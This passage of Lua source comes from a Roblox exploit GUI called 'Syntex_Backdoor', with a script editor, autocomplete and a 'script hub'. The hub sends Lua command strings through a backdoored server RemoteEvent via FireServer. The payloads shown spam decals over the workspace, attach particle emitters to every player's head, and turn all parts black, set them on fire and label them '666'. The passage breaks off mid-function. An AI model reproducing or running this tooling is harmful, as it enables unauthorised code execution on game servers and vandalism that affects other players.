		buttonContainer.Name = buttonName
		buttonContainer.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		buttonContainer.BackgroundTransparency = 0.85
		buttonContainer.Size = UDim2.new(0, buttonWidth, 0, buttonHeight)
		buttonContainer.Parent = buttonsContainer

		local corner = Instance.new("UICorner", buttonContainer)
		corner.CornerRadius = UDim.new(0, 4)
		local stroke = Instance.new("UIStroke", buttonContainer)
		stroke.Transparency = 0.5
		stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
		stroke.Thickness = 2
		stroke.Color = Color3.fromRGB(40, 40, 40)

		local textLabel = Instance.new("TextLabel")
		textLabel.Name = "ScriptNameLabel"
		textLabel.Size = UDim2.new(1, -26, 1, 0)
		textLabel.Position = UDim2.new(0, 6, 0, 0)
		textLabel.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
		textLabel.BackgroundTransparency = 1
		textLabel.Text = buttonName
		textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
		textLabel.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.SemiBold, Enum.FontStyle.Normal)
		textLabel.TextSize = 14
		textLabel.TextXAlignment = Enum.TextXAlignment.Left
		textLabel.Parent = buttonContainer

		local iconButton = Instance.new("ImageButton")
		iconButton.Name = "IconButton"
		iconButton.BackgroundTransparency = 1
		iconButton.Size = UDim2.new(0, 24, 0, 24)
		iconButton.Position = UDim2.new(0, 4, 0.5, -12)
		iconButton.Image = ""
		iconButton.Parent = buttonContainer

		local TweenService = game:GetService("TweenService")
		local defaultColor = Color3.new(1,1,1)
		local hoverColor = Color3.fromRGB(0, 255, 0)
		local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		iconButton.MouseEnter:Connect(function()
			TweenService:Create(iconButton, tweenInfo, {ImageColor3 = hoverColor}):Play()
		end)
		iconButton.MouseLeave:Connect(function()
			TweenService:Create(iconButton, tweenInfo, {ImageColor3 = defaultColor}):Play()
		end)

		iconButton.MouseButton1Click:Connect(function()
			scriptContentTextBox.Text = scriptContent
		end)

		local clickOverlay = Instance.new("TextButton")
		clickOverlay.BackgroundTransparency = 1
		clickOverlay.Size = UDim2.new(1, 0, 1, 0)
		clickOverlay.Position = UDim2.new(0, 0, 0, 0)
		clickOverlay.Text = ""
		clickOverlay.Parent = buttonContainer

		clickOverlay.MouseButton1Click:Connect(function()
			scriptContentTextBox.Text = scriptContent
		end)

		-- Delete button
		local deleteButton = Instance.new("ImageButton")
		deleteButton.Name = "DeleteButton"
		deleteButton.Size = UDim2.new(0, 20, 0, 20)
		deleteButton.Position = UDim2.new(1, -22, 0.5, -10)
		deleteButton.BackgroundTransparency = 1
		deleteButton.Image = "rbxassetid://111831798368263"
		deleteButton.Parent = buttonContainer

		deleteButton.MouseEnter:Connect(function()
			TweenService:Create(deleteButton, tweenInfo, {ImageColor3 = Color3.fromRGB(255,0,0)}):Play()
		end)
		deleteButton.MouseLeave:Connect(function()
			TweenService:Create(deleteButton, tweenInfo, {ImageColor3 = Color3.new(1,1,1)}):Play()
		end)

		deleteButton.MouseButton1Click:Connect(function()
			savedScripts[buttonName] = nil
			buttonContainer:Destroy()
			Notification("Custom", "Script Deleted")
		end)

		if buttonIndex == 1 then
			buttonContainer.Position = UDim2.new(initialXScale, 0, initialYScale, 0)
		else
			local totalPreviousHeight = (buttonHeight + buttonSpacing) * (buttonIndex - 1)
			local yOffset = initialYScale + (totalPreviousHeight / buttonsContainer.AbsoluteSize.Y)
			buttonContainer.Position = UDim2.new(initialXScale, 0, yOffset, 0)
		end

		return buttonContainer
	end

	local function saveButtonAndScript(buttonName, scriptContent)
		savedScripts[buttonName] = scriptContent
	end

	local function onCreateButtonClick()
		local buttonName = buttonNameTextBox.Text .. ".lua"
		local scriptContent = scriptContentTextBox.Text

		if buttonName == "" then return end

		saveButtonAndScript(buttonName, scriptContent)

		local buttonCount = 0
		for _, child in pairs(buttonsContainer:GetChildren()) do
			if child:IsA("TextButton") then
				buttonCount = buttonCount + 1
			end
		end

		createStyledButton(buttonName, scriptContent, buttonCount + 1)
		Notification("Success", "Script Successfully Saved.")
	end

	local function loadSavedScripts()
		local buttonIndex = 1
		for buttonName, scriptContent in pairs(savedScripts) do
			createStyledButton(buttonName, scriptContent, buttonIndex)
			buttonIndex = buttonIndex + 1
		end
	end

	local function onSaveScriptClick()
		script.Parent.Parent.ideContainer.saveScriptFrame.Visible = true
	end

	local createButton = script.Parent.Parent.ideContainer.saveScriptFrame.scriptName.saveButton
	local isSaving = false

	createButton.MouseButton1Click:Connect(function()
		if isSaving then return end
		isSaving = true

		script.Parent.Parent.ideContainer.saveScriptFrame.Visible = false
		onCreateButtonClick()

		isSaving = false
	end)

	local saveButton = script.Parent.Parent.ideContainer.buttons.saveScript
	saveButton.MouseButton1Click:Connect(onSaveScriptClick)

	loadSavedScripts()
end;
task.spawn(C_6c);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.savedScriptsContainer.lunarThemeGradient.LocalScript
local function C_6e()
	local script = G2L["6e"];
	while true do
		wait(0.1)
		script.Parent.Rotation += 1
	end
end;
task.spawn(C_6e);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.AC.AC_Handler
local function C_74()
	local script = G2L["74"];
	local IconMap = {
		Globals = "rbxassetid://122898308967020",
		Services = "rbxassetid://84757727963014",
		Functions = "rbxassetid://93462321869104",
		Event = "rbxassetid://124182880981997",
		Enums = "rbxassetid://106992449064152"
	}

	local Function = {
		"asset","c̶o̶l̶l̶e̶c̶t̶g̶a̶r̶b̶a̶g̶e̶","error","gcinfo","g̶e̶t̶f̶e̶n̶v̶","getmetatable","ipairs","loadstring","newproxy","next","pairs","pcall","print","rawequal",
		"rawget","rawlen","rawset","require","select","s̶e̶t̶f̶e̶n̶v̶","setmatatable","tonumber","tostring",
		"type","unpack","xpcall", "warn","wait","W̶a̶i̶t̶","spawn","delay","tick","time","typeof","y̶p̶c̶a̶l̶l̶","s̶t̶a̶t̶s̶","S̶t̶a̶t̶s̶","UserSettings","S̶p̶a̶w̶n̶","V̶e̶r̶s̶i̶o̶n̶","v̶e̶r̶s̶i̶o̶n̶"
	}

	local Properties = {
		"Name",
		"Parent",
		"ClassName",
		"Archivable",
		"Position",
		"Size",
		"AnchorPoint",
		"Rotation",
		"Visible",
		"ZIndex",
		"AutomaticSize",
		"BackgroundColor3",
		"BackgroundTransparency",
		"BorderSizePixel",
		"Text",
		"TextSize",
		"TextColor3",
		"TextTransparency",
		"Font",
		"FontFace",
		"TextWrapped",
		"TextScaled",
		"TextXAlignment",
		"TextYAlignment",
		"Image",
		"ImageColor3",
		"ImageTransparency",
		"ScaleType",
		"Active",
		"Selectable"
	}

	local Event = {
		"Changed",
		"ChildAdded",
		"ChildRemoved",
		"DescendantAdded",
		"DescendantRemoving",
		"AncestryChanged",
		"PlayerAdded",
		"PlayerRemoving",
		"CharacterAdded",
		"CharacterRemoving",
		"InputBegan",
		"InputChanged",
		"InputEnded",
		"RenderStepped",
		"Stepped",
		"Heartbeat",
		"Activated",
		"MouseEnter",
		"MouseLeave",
		"MouseButton1Down",
		"MouseButton1Up",
		"MouseButton1Click",
		"TouchTap",
		"Focused",
		"FocusLost"
	}

	local Enums = {
		"Enum",
		"Enum.KeyCode",
		"Enum.UserInputType",
		"Enum.Material",
		"Enum.Font",
		"Enum.TextXAlignment",
		"Enum.TextYAlignment",
		"Enum.EasingStyle",
		"Enum.EasingDirection",
		"Enum.CameraType",
		"Enum.CameraMode",
		"Enum.RenderPriority",
		"Enum.SurfaceType",
		"Enum.NormalId",
		"Enum.MeshType",
		"Enum.ScaleType",
		"Enum.AutomaticSize",
		"Enum.FillDirection",
		"Enum.HorizontalAlignment",
		"Enum.VerticalAlignment"
	}

	local Services = {
		"Players",
		"Workspace",
		"Lighting",
		"ReplicatedStorage",
		"ServerStorage",
		"ServerScriptService",
		"StarterGui",
		"StarterPack",
		"StarterPlayer",
		"SoundService",
		"TweenService",
		"RunService",
		"UserInputService",
		"ContextActionService",
		"HttpService",
		"TextService",
		"TeleportService",
		"DataStoreService",
		"MarketplaceService",
		"PhysicsService",
		"PathfindingService",
		"CollectionService",
		"Debris",
		"Chat",
		"InsertService",
		"LocalizationService",
		"ProximityPromptService",
		"GroupService",
		"BadgeService",
		"MemoryStoreService",
		"PolicyService",
		"Selection",
		"TestService",
		"AssetService",
		"VoiceChatService",
		"Players",
		"Teams"
	}

	local Globals = {
		"_G",
		"_VERSION",
	}

	local TextService = game:GetService("TextService")
	local UserInputService = game:GetService("UserInputService")
	local CAS = game:GetService("ContextActionService")
	local RunService = game:GetService("RunService")
	local GuiService = game:GetService("GuiService")

	local ScrollingFrame = script.Parent
	local Template = ScrollingFrame:WaitForChild("TextButton")
	local InputBox = ScrollingFrame.Parent.ideContainer.ideScroll.ide
	local ListLayout = ScrollingFrame:FindFirstChildOfClass("UIListLayout")

	Template.Visible = false
	ScrollingFrame.Visible = false
	ScrollingFrame.AutomaticCanvasSize = Enum.AutomaticSize.None
	ScrollingFrame.CanvasSize = UDim2.new()

	local MAX_VISIBLE = 5
	local ITEM_HEIGHT = 19
	local WIDTH = 248
	local PADDING_Y = 4
	local UIS = game:GetService("UserInputService")
	local IsApplying = false

	local NORMAL_COLOR = Color3.fromRGB(255, 255, 255)

	local AllItems = {}
	local Buttons = {}
	local SelectedIndex = 0

	for _, v in ipairs(Function) do
		table.insert(AllItems, { Name = v, Type = "Functions" })
	end
	for _, v in ipairs(Properties) do
		table.insert(AllItems, { Name = v, Type = "Globals" })
	end
	for _, v in ipairs(Enums) do
		table.insert(AllItems, { Name = v, Type = "Enums" })
	end
	for _, v in ipairs(Event) do
		table.insert(AllItems, { Name = v, Type = "Event" })
	end
	for _, v in ipairs(Services) do
		table.insert(AllItems, { Name = v, Type = "Services" })
	end
	for _, v in ipairs(Globals) do
		table.insert(AllItems, { Name = v, Type = "Globals" })
	end

	-- ===== Utils =====

	local function Clear()
		for _, b in ipairs(Buttons) do
			b:Destroy()
		end
		table.clear(Buttons)
		SelectedIndex = 0
	end

	local function getCurrentWord(text, cursor)
		text = text:sub(1, cursor - 1)
		return text:match("([%w_%.]+)$") or ""
	end

	local function applySelection(word)
		local cursor = InputBox.CursorPosition
		if cursor <= 0 then return end

		local text = InputBox.Text
		local left = text:sub(1, cursor - 1)
		local right = text:sub(cursor)

		left = left:gsub("([%w_%.]+)$", "")

		InputBox.Text = left .. word .. right
		InputBox.CursorPosition = #left + #word + 1
	end

	-- ===== UI =====

	local function UpdatePosition()
		if not InputBox:IsFocused() then
			ScrollingFrame.Visible = false
			return
		end

		local cursor = InputBox.CursorPosition
		if cursor <= 0 then return end

		local before = InputBox.Text:sub(1, cursor - 1)

		local lines = string.split(before, "\n")
		local lastLine = lines[#lines]

		local font = InputBox.Font
		if font == Enum.Font.Unknown then
			font = Enum.Font.Gotham -- fallback font
		end

		local textSize = TextService:GetTextSize(
			lastLine,
			InputBox.TextSize,
			font,
			Vector2.new(1e6, 1e6)
		)

		local paddingX = 2
		local paddingY = 0

		local absX =
			InputBox.AbsolutePosition.X
			+ paddingX
			+ textSize.X

		local absY =
			InputBox.AbsolutePosition.Y
			+ paddingY
			+ ((#lines - 1) * InputBox.TextSize)
			+ InputBox.TextSize
			+ 4

		local parent = ScrollingFrame.Parent
		local localX = absX - parent.AbsolutePosition.X
		local localY = absY - parent.AbsolutePosition.Y

		ScrollingFrame.Position = UDim2.fromOffset(localX, localY)
	end

	local function UpdateSize()
		local count = #Buttons
		if count == 0 then
			ScrollingFrame.Visible = false
			return
		end

		if count <= MAX_VISIBLE then
			ScrollingFrame.Size = UDim2.fromOffset(
				WIDTH,
				ListLayout.AbsoluteContentSize.Y
			)
			ScrollingFrame.CanvasSize = ScrollingFrame.Size
			ScrollingFrame.ScrollBarImageTransparency = 1
			ScrollingFrame.CanvasPosition = Vector2.zero
		else
			local viewHeight = MAX_VISIBLE * ITEM_HEIGHT + PADDING_Y
			ScrollingFrame.Size = UDim2.fromOffset(WIDTH, viewHeight)
			ScrollingFrame.CanvasSize = UDim2.fromOffset(
				0,
				ListLayout.AbsoluteContentSize.Y
			)
			ScrollingFrame.ScrollBarImageTransparency = 0
		end
	end

	local function ScrollToSelected()
		local btn = Buttons[SelectedIndex]
		if not btn then return end

		local y = btn.AbsolutePosition.Y - ScrollingFrame.AbsolutePosition.Y
		local viewTop = ScrollingFrame.CanvasPosition.Y
		local viewBottom = viewTop + ScrollingFrame.AbsoluteWindowSize.Y

		if y < viewTop then
			ScrollingFrame.CanvasPosition = Vector2.new(0, y)
		elseif y + btn.AbsoluteSize.Y > viewBottom then
			ScrollingFrame.CanvasPosition = Vector2.new(
				0,
				y + btn.AbsoluteSize.Y - ScrollingFrame.AbsoluteWindowSize.Y
			)
		end
	end

	local function CreateItem(name, itemType)
		local btn = Template:Clone()
		btn.Visible = true
		btn.Parent = ScrollingFrame

		btn.TextLabel.Text = name
		btn.ImageLabel.Image = IconMap[itemType] or ""

		btn.MouseButton1Click:Connect(function()
			local i = table.find(Buttons, btn)
			if not i then return end

			SelectedIndex = i
			applySelection(btn.TextLabel.Text)
			ScrollingFrame.Visible = false
			Clear()
		end)

		table.insert(Buttons, btn)
	end

	-- ===== Autocomplete =====

	local function UpdateAutocomplete()
		Clear()

		local cursor = InputBox.CursorPosition
		if cursor <= 0 then
			ScrollingFrame.Visible = false
			return
		end

		local word = getCurrentWord(InputBox.Text, cursor)
		if word == "" then
			ScrollingFrame.Visible = false
			return
		end

		word = word:lower()

		local exactMatch = false

		for _, item in ipairs(AllItems) do
			local name = tostring(item.Name)
			local lowerName = name:lower()

			if lowerName == word then
				exactMatch = true
				break
			end

			if lowerName:sub(1, #word) == word then
				CreateItem(name, item.Type)
			end
		end

		-- hide autocomplete if full word is typed
		if exactMatch then
			ScrollingFrame.Visible = false
			Clear()
			return
		end

		if #Buttons == 0 then
			ScrollingFrame.Visible = false
			return
		end

		SelectedIndex = 1
		UpdatePosition()
		UpdateSize()
		ScrollingFrame.Visible = true
	end

	InputBox:GetPropertyChangedSignal("Text"):Connect(UpdateAutocomplete)
	InputBox:GetPropertyChangedSignal("CursorPosition"):Connect(UpdatePosition)
	RunService.RenderStepped:Connect(UpdatePosition)
end;
task.spawn(C_74);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Home.userINFO
local function C_7d()
	local script = G2L["7d"];
	local user = game.Players.LocalPlayer.Name
	local Players = game:GetService("Players")
	local localPlayer = Players.LocalPlayer
	local imgLabel = script.Parent.ImageLabel

	local function geturicon()
		local userId = localPlayer.UserId
		local thumbnailType = Enum.ThumbnailType.HeadShot
		local thumbnailSize = Enum.ThumbnailSize.Size420x420

		local success, thumbnailUrl = pcall(function()
			return Players:GetUserThumbnailAsync(userId, thumbnailType, thumbnailSize)
		end)

		if success then
			return thumbnailUrl
		else
			warn("Failed to get profile picture: " .. tostring(thumbnailUrl))
			return nil
		end
	end

	local profilePictureUrl = geturicon()
	imgLabel.Image = profilePictureUrl
	script.Parent.wlcmsg.Text = "Welcome, <font color='#d815ff'>" .. user .. "</font>"
end;
task.spawn(C_7d);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Home.UIGradient.LocalScript
local function C_80()
	local script = G2L["80"];
	while true do
		wait(0.1)
		script.Parent.Rotation += 1
	end
end;
task.spawn(C_80);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Home.galaxyThemeGradient.LocalScript
local function C_87()
	local script = G2L["87"];
	while true do
		wait(0.1)
		script.Parent.Rotation += 1
	end
end;
task.spawn(C_87);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Home.lunarThemeGradient.LocalScript
local function C_89()
	local script = G2L["89"];
	while true do
		wait(0.1)
		script.Parent.Rotation += 1
	end
end;
task.spawn(C_89);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.Decal.LocalScript
local function C_98()
	local script = G2L["98"];
	local IDTextBox = script.Parent.Parent.Parent.ID 

	script.Parent.MouseButton1Click:Connect(function()
		local ID = IDTextBox.Text
		print("Button clicked. ID: " .. ID)

		if ID == "" then
			print("Error: ID is empty.")
			return
		end

		local command = [[
	        local normalIds = {
	            Enum.NormalId.Front,
	            Enum.NormalId.Back,
	            Enum.NormalId.Top,
	            Enum.NormalId.Bottom,
	            Enum.NormalId.Left,
	            Enum.NormalId.Right
	        }
	
	        print("Applying decals to parts...")
	        for _, v in pairs(game.Workspace:GetChildren()) do
	            if v:IsA('Part') then
	                for i = 1, #normalIds do
	                    local decal = Instance.new('Decal')
	                    decal.Texture = 'http://www.roblox.com/asset/?id=]] .. ID .. [['
	                    decal.Parent = v
	                    decal.Face = normalIds[i]
	                end
	            end
	        end
	
	        print("Applying decals to models...")
	        for _, v in pairs(game.Workspace:GetChildren()) do
	            if v:IsA('Model') then
	                for _, z in pairs(v:GetChildren()) do
	                    if z:IsA('Part') then
	                        for i = 1, #normalIds do
	                            local decal = Instance.new('Decal')
	                            decal.Texture = 'http://www.roblox.com/asset/?id=]] .. ID .. [['
	                            decal.Parent = z
	                            decal.Face = normalIds[i]
	                        end
	                    end
	                end
	            end
	        end
	
	        print("Finished applying all changes.")
	    ]]

		local function Notification(notificationType, messageText)
			local function getNotificationType(nType)
				if nType == "Success" then
					return Color3.new(0, 1, 0)
				elseif nType == "Error" then
					return Color3.new(1, 0, 0)
				elseif nType == "Custom" then
					return Color3.new(0.976471, 0.733333, 0)
				end
			end
			local player = game:GetService("Players").LocalPlayer
			local TweenService = game:GetService("TweenService")
			local uicrn = Instance.new("UICorner")
			local container = player.PlayerGui:FindFirstChild("NotificationContainer")
			if not container then
				container = Instance.new("Frame")
				container.Name = "NotificationContainer"
				container.Parent = player.PlayerGui
				container.Size = UDim2.new(1, 0, 1, 0)
				container.BackgroundTransparency = 1
				container.Position = UDim2.new(0, 0, 0, 0)
			end
			task.wait(0.05)

			local function Checkframes()
				local count = 0
				for _, gui in ipairs(container:GetChildren()) do
					if gui:IsA("ScreenGui") and gui:GetAttribute("Active") then
						count += 1
					end
				end
				return count
			end
			local existing = Checkframes()

			local gui = Instance.new("ScreenGui")
			gui.Name = "SimpleNotify"
			gui.ResetOnSpawn = false
			gui.Parent = container
			gui:SetAttribute("Active", true) 

			local mainFrame = Instance.new("Frame")
			mainFrame.Name = "MainFrame"
			mainFrame.Parent = gui
			mainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
			mainFrame.BackgroundTransparency = 0.15
			uicrn.Parent = mainFrame
			local offset = -80 - ((existing - 1) * 70) 
			mainFrame.Position = UDim2.new(1, 0, 1, offset)
			mainFrame.Size = UDim2.new(0, 260, 0, 60) 
			mainFrame.AnchorPoint = Vector2.new(1, 1) 

			local title = Instance.new("TextLabel")
			title.Name = "Title"
			title.Parent = mainFrame
			title.BackgroundTransparency = 1
			title.Position = UDim2.new(0, 12, 0, 8)
			title.Size = UDim2.new(1, -24, 0, 24)
			title.Font = Enum.Font.GothamBold
			title.Text = "Starlight Backdoor"
			title.TextColor3 = Color3.new(1, 1, 1)
			title.TextSize = 16
			title.TextXAlignment = Enum.TextXAlignment.Left

			local message = Instance.new("TextLabel")
			message.Name = "Message"
			message.Parent = mainFrame
			message.BackgroundTransparency = 1
			message.Position = UDim2.new(0, 12, 0, 32)
			message.Size = UDim2.new(1, -24, 0, 20)
			message.Font = Enum.Font.Gotham
			message.Text = messageText
			message.TextColor3 = Color3.new(0.8, 0.8, 0.8)
			message.TextSize = 14
			message.TextXAlignment = Enum.TextXAlignment.Left

			local greenBar = Instance.new("Frame")
			greenBar.Name = "GreenBar"
			greenBar.Parent = mainFrame
			greenBar.BackgroundColor3 = getNotificationType(notificationType)
			greenBar.Size = UDim2.new(1, 0, 0, 5)
			greenBar.Position = UDim2.new(0, 0, 1, -4)
			greenBar.BorderSizePixel = 0

			local uigrd = Instance.new("UIGradient", mainFrame)
			uigrd.Rotation = 132
			uigrd.Color = ColorSequence.new{
				ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 27, 255)),
				ColorSequenceKeypoint.new(0.515, Color3.fromRGB(49, 49, 49)),
				ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 248, 0))
			}

			local greenBarUICorner = Instance.new("UICorner")
			greenBarUICorner.Parent = greenBar
			uicrn.CornerRadius = UDim.new(0, 5)

			local slideIn = TweenService:Create(
				mainFrame,
				TweenInfo.new(0.7, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
				{Position = UDim2.new(1, -20, 1, offset)}
			)

			slideIn:Play()

			local greenBarTween = TweenService:Create(
				greenBar,
				TweenInfo.new(2, Enum.EasingStyle.Linear),
				{Size = UDim2.new(0, 0, 0, 5)}
			)
			greenBarTween:Play()

			greenBarTween.Completed:Wait()

			local slideOut = TweenService:Create(
				mainFrame,
				TweenInfo.new(0.4, Enum.EasingStyle.Quad),
				{Position = UDim2.new(1, 300, 1, offset)}
			)
			slideOut:Play()

			slideOut.Completed:Wait()
			gui:SetAttribute("Active", false)
			gui:Destroy()
		end

		local pathString = script.Parent.Parent.Parent.Parent.Parent.Parent.mainScripts.remotePath.Value
		local current = game
		for part in string.gmatch(pathString, "[^.]+") do
			current = current:FindFirstChild(part)
			if not current then
				warn("Path not found:", part)
				return
			end
		end

		if current == game then
			Notification("Error", "Please attach before using script hub.")
		else
			current:FireServer(command)
			Notification("Success", script.Parent.Name.." executed.")
		end
	end)
end;
task.spawn(C_98);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.Particles.LocalScript
local function C_9c()
	local script = G2L["9c"];
	local IDTextBox = script.Parent.Parent.Parent.ID

	script.Parent.MouseButton1Click:Connect(function()
		local ID = IDTextBox.Text
		print("ID: " .. ID)

		if ID == "" then
			print("Error: ID is empty.")
			return
		end

		local command = [[
	        local ID = "]] .. ID .. [["
	        for _, player in pairs(game.Players:GetPlayers()) do
	            if player.Character and player.Character:FindFirstChild("Head") then
	                local emit = Instance.new("ParticleEmitter")
	                emit.Parent = player.Character.Head
	                emit.Texture = "http://www.roblox.com/asset/?id=" .. ID
	                emit.VelocitySpread = 100000
	            end
	        end
	    ]]

		local function Notification(notificationType, messageText)
			local function getNotificationType(nType)
				if nType == "Success" then
					return Color3.new(0, 1, 0)
				elseif nType == "Error" then
					return Color3.new(1, 0, 0)
				elseif nType == "Custom" then
					return Color3.new(0.976471, 0.733333, 0)
				end
			end
			local player = game:GetService("Players").LocalPlayer
			local TweenService = game:GetService("TweenService")
			local uicrn = Instance.new("UICorner")
			local container = player.PlayerGui:FindFirstChild("NotificationContainer")
			if not container then
				container = Instance.new("Frame")
				container.Name = "NotificationContainer"
				container.Parent = player.PlayerGui
				container.Size = UDim2.new(1, 0, 1, 0)
				container.BackgroundTransparency = 1
				container.Position = UDim2.new(0, 0, 0, 0)
			end
			task.wait(0.05)

			local function Checkframes()
				local count = 0
				for _, gui in ipairs(container:GetChildren()) do
					if gui:IsA("ScreenGui") and gui:GetAttribute("Active") then
						count += 1
					end
				end
				return count
			end
			local existing = Checkframes()

			local gui = Instance.new("ScreenGui")
			gui.Name = "SimpleNotify"
			gui.ResetOnSpawn = false
			gui.Parent = container
			gui:SetAttribute("Active", true) 

			local mainFrame = Instance.new("Frame")
			mainFrame.Name = "MainFrame"
			mainFrame.Parent = gui
			mainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
			mainFrame.BackgroundTransparency = 0.15
			uicrn.Parent = mainFrame
			local offset = -80 - ((existing - 1) * 70) 
			mainFrame.Position = UDim2.new(1, 0, 1, offset)
			mainFrame.Size = UDim2.new(0, 260, 0, 60) 
			mainFrame.AnchorPoint = Vector2.new(1, 1) 

			local title = Instance.new("TextLabel")
			title.Name = "Title"
			title.Parent = mainFrame
			title.BackgroundTransparency = 1
			title.Position = UDim2.new(0, 12, 0, 8)
			title.Size = UDim2.new(1, -24, 0, 24)
			title.Font = Enum.Font.GothamBold
			title.Text = "Starlight Backdoor"
			title.TextColor3 = Color3.new(1, 1, 1)
			title.TextSize = 16
			title.TextXAlignment = Enum.TextXAlignment.Left

			local message = Instance.new("TextLabel")
			message.Name = "Message"
			message.Parent = mainFrame
			message.BackgroundTransparency = 1
			message.Position = UDim2.new(0, 12, 0, 32)
			message.Size = UDim2.new(1, -24, 0, 20)
			message.Font = Enum.Font.Gotham
			message.Text = messageText
			message.TextColor3 = Color3.new(0.8, 0.8, 0.8)
			message.TextSize = 14
			message.TextXAlignment = Enum.TextXAlignment.Left

			local greenBar = Instance.new("Frame")
			greenBar.Name = "GreenBar"
			greenBar.Parent = mainFrame
			greenBar.BackgroundColor3 = getNotificationType(notificationType)
			greenBar.Size = UDim2.new(1, 0, 0, 5)
			greenBar.Position = UDim2.new(0, 0, 1, -4)
			greenBar.BorderSizePixel = 0

			local uigrd = Instance.new("UIGradient", mainFrame)
			uigrd.Rotation = 132
			uigrd.Color = ColorSequence.new{
				ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 27, 255)),
				ColorSequenceKeypoint.new(0.515, Color3.fromRGB(49, 49, 49)),
				ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 248, 0))
			}

			local greenBarUICorner = Instance.new("UICorner")
			greenBarUICorner.Parent = greenBar
			uicrn.CornerRadius = UDim.new(0, 5)

			local slideIn = TweenService:Create(
				mainFrame,
				TweenInfo.new(0.7, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
				{Position = UDim2.new(1, -20, 1, offset)}
			)

			slideIn:Play()

			local greenBarTween = TweenService:Create(
				greenBar,
				TweenInfo.new(2, Enum.EasingStyle.Linear),
				{Size = UDim2.new(0, 0, 0, 5)}
			)
			greenBarTween:Play()

			greenBarTween.Completed:Wait()

			local slideOut = TweenService:Create(
				mainFrame,
				TweenInfo.new(0.4, Enum.EasingStyle.Quad),
				{Position = UDim2.new(1, 300, 1, offset)}
			)
			slideOut:Play()

			slideOut.Completed:Wait()
			gui:SetAttribute("Active", false)
			gui:Destroy()
		end

		local pathString = script.Parent.Parent.Parent.Parent.Parent.Parent.mainScripts.remotePath.Value
		local current = game
		for part in string.gmatch(pathString, "[^.]+") do
			current = current:FindFirstChild(part)
			if not current then
				warn("Path not found:", part)
				return
			end
		end

		if current == game then
			Notification("Error", "Please attach before using script hub.")
		else
			current:FireServer(command)
			Notification("Success", script.Parent.Name.." executed.")
		end
	end)
end;
task.spawn(C_9c);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.666.LocalScript
local function C_a0()
	local script = G2L["a0"];
	script.Parent.MouseButton1Click:Connect(function()
		local command = [[
		for i,v in next,workspace:children''do
			if(v:IsA'BasePart')then
				local me=v;
				local bbg=Instance.new('BillboardGui',me);
				bbg.Name='stuf';
				bbg.Adornee=me;
				bbg.Size=UDim2.new(2.5,0,2.5,0)
				--bbg.StudsOffset=Vector3.new(0,2,0)
				local tlb=Instance.new'TextLabel';
				tlb.Text='666 666 666 666 666 666';
				tlb.Font='SourceSansBold';
				tlb.FontSize='Size48';
				tlb.TextColor3=Color3.new(1,0,0);
				tlb.Size=UDim2.new(1.25,0,1.25,0);
				tlb.Position=UDim2.new(-0.125,-22,-1.1,0);
				tlb.BackgroundTransparency=1;
				tlb.Parent=bbg;
			end;end;
		local function xds(dd)
			for i,v in next,dd:children''do
				if(v:IsA'BasePart')then
					v.BrickColor=BrickColor.new'Really black';
					v.TopSurface='Smooth';
					v.BottomSurface='Smooth';
					local s=Instance.new('SelectionBox',v);
					s.Adornee=v;
					s.Color=BrickColor.new'Really red';
					local a=Instance.new('PointLight',v);
					a.Color=Color3.new(1,0,0);
					a.Range=15;
					a.Brightness=5;
					local f=Instance.new('Fire',v);
					f.Size=19;
					f.Heat=22;
				end;
	
				local dec = 'http://www.roblox.com/asset/?id=19399245';
				local fac = {'Front', 'Back', 'Left', 'Right', 'Top', 'Bottom'}
				--coroutine.wrap(function()
				--for ,_ in pairs(fac) do
				--local ddec = Instance.new("Decal", v)
				--ddec.Face = 
				--ddec.Texture = dec
				--end end)()
				if #(v:GetChildren())>0 then
					xds(v) 
				end
			end
		end
		xds(game.Workspace)
	    ]]

		local function Notification(notificationType, messageText)
			local function getNotificationType(nType)
				if nType == "Success" then
					return Color3.new(0, 1, 0)
				elseif nType == "Error" then
					return Color3.new(1, 0, 0)
				elseif nType == "Custom" then
					return Color3.new(0.976471, 0.733333, 0)
				end
			end
			local player = game:GetService("Players").LocalPlayer
			local TweenService = game:GetService("TweenService")
			local uicrn = Instance.new("UICorner")
			local container = player.PlayerGui:FindFirstChild("NotificationContainer")
			if not container then
				container = Instance.new("Frame")
				container.Name = "NotificationContainer"
				container.Parent = player.PlayerGui
				container.Size = UDim2.new(1, 0, 1, 0)
				container.BackgroundTransparency = 1
				container.Position = UDim2.new(0, 0, 0, 0)
			end
			task.wait(0.05)

			local function Checkframes()
				local count = 0
				for _, gui in ipairs(container:GetChildren()) do
					if gui:IsA("ScreenGui") and gui:GetAttribute("Active") then
						count += 1
					end
				end
				return count
			end
			local existing = Checkframes()

			local gui = Instance.new("ScreenGui")
			gui.Name = "SimpleNotify"
			gui.ResetOnSpawn = false
			gui.Parent = container
			gui:SetAttribute("Active", true) 

			local mainFrame = Instance.new("Frame")
			mainFrame.Name = "MainFrame"
			mainFrame.Parent = gui
			mainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
			mainFrame.BackgroundTransparency = 0.15
			uicrn.Parent = mainFrame
			local offset = -80 - ((existing - 1) * 70) 
